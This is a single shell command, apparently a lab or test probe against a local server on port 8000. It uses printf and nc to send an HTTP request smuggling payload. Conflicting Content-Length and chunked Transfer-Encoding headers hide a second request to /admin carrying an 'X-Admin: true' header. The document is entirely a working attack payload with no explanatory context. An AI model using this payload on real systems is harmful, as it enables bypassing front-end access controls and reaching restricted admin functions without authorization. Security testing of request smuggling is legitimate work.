
```
printf 'POST /submit HTTP/1.1\r\nHost: test\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: test\r\nX-Admin: true\r\n\r\n' | nc 127.0.0.1 8000
```
